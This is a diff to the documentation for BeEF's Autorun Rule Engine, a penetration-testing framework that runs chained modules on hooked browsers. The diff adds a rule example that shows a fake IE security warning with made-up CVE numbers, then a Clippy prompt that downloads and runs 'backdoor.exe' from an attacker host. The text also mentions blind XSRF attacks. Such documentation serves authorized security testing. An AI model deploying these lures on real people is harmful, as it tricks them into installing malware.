@@ -2,9 +2,10 @@
 The Autorun Rule Engine (ARE from now on) is a core BeEF component which allows you to define rules
 that are automatically triggered on the hooked browser if certain conditions are matched.
 
-If you are a BeEF aficionado, you were probably waiting for this form a long time. The old static autorun functionality has been removed. The main features of the new ARE are the following:
+If you are a BeEF aficionado, you were probably waiting for this from a long time :-) The old static autorun functionality has been removed. The main features of the new ARE are the following:
 * **Dynamic** : pre-load rules from <beef_root>/arerules/enabled directory at start-up, or load them at runtime while BeEF is running, then trigger them on each hooked browser. RESTful API calls are documented in detail later here.
 * **Non-intrusive** : command modules now have support for returning execution status and result data (useful for chaining). This didn't required a huge refactoring, but some smart changes in the API only. Command modules that are not adapted to be run with nested-forward chaining mode return UNKNOWN status by default. You can still launch them with the sequential chaining mode. If you need to chain modules output/input though, you will need to add one or two lines of dumb-proof JavaScript to the command modules if the rule is in nested-forward chain mode (more on this later here). 
+* **Evolving** : you will likely see the ARE evolve to address common client-side needs for the lazy pentester.
 
 ## Matching
 On successful hook, the ARE checks if any rulesets present in the core_arerules table match against the hooked browsers. Various hooked browser properties are checked:
@@ -13,6 +14,7 @@ On successful hook, the ARE checks if any rulesets present in the core_arerules 
 * (WIP) Plugin type/version
 * (WIP) OS architecture
 
+## Matching examples
 Trigger only on Safari browsers >= 7, on OSX Yosemite or below.
 ```javascript
 {
@@ -52,12 +54,12 @@ The following are the allowed Browser/OS types and version supported with the AR
 Have a look in browser.js and os.js (<beef_root>/core/main/client) to see exactly what is supported.
 
 ## Chaining mode
-There are currently two chain modes implemented, which should cover most of your client-side needs.
+There are currently two chaining modes implemented, which should cover most of your client-side needs.
 ### Sequential
 Call N modules with different configurable time delays.
-Sequential mode wraps module bodies in their own function, using setTimeout() to trigger them with a time delay if specified. Execution order is also available to let you write down modules in an organised way in the JSON file, but then call them in different order. 
+Sequential mode wraps module bodies in their own functions, using setTimeout() to call them with a time delay if specified. Execution order is also available to let you write down modules in an organised way in the JSON file, but then call them in different order. 
 
-Note that module execution status is not checked, and results are ignored. Useful if you just want to launch some modules without caring what their status will be (for instance, a bunch of blind XSRFs on a set of targets).
+Note that module execution status is not checked, and results are ignored. Useful if you just want to launch some modules without caring what their status will be (for instance, a bunch of blind XSRFs on a set of targets). Moreover, as explained later, this chaining mode allows you to launch N modules that are not prepared for the BeEF ARE (as in, they don't return information about the execution status or result data).
 
 The resulting wrapper is something like this:
 ```javascript
@@ -66,6 +68,40 @@ The resulting wrapper is something like this:
  setTimeout(module_three(), 3000);
 ```
 
+Display a fake notification (target only IE >= 10 on Windows 7 or higher, then after 2 seconds call the Clippy module with a custom Windows-only dropper that was pre-mounted in BeEF.
+```javascript
+{
+  "name": "Ie Fake Notification + Clippy",
+  "author": "antisnatchor",
+  "browser": "IE",
+  "browser_version": ">= 10",
+  "os": "Windows",
+  "os_version": ">= 7",
+  "modules": [
+    {
+      "name": "fake_notification_ie",
+      "condition": null,
+      "options": {
+        "notification_text":"Internet Explorer SECURITY NOTIFICATION: your browser is outdated and vulnerable to critical security vulnerabilities like CVE-2015-009 and CVE-2014-879. Please update it."
+      }
+    }
+  ,{
+      "name": "clippy",
+      "condition": null,
+      "options": {
+        "clippydir": "http://clippy.ajbnet.com/1.0.0/",
+        "askusertext": "Your browser appears to be out of date. Would you like to upgrade it?",
+        "executeyes": "http://172.16.45.1:3000/updates/backdoor.exe",
+        "respawntime":"5000",
+        "thankyoumessage":"Thanks for upgrading your browser! Look forward to a safer, faster web!"
+      }
+    }
+  ],
+  "execution_order": [0,1],
+  "execution_delay": [0,2000],
+  "chain_mode": "sequential"
+}
+```javascript
 ### Nested-forward
 Call N modules, where module N is executed only if N-1 returns a certain status. Module N can use as input the output from module N-1 (eventually mangling it before processing it).
 
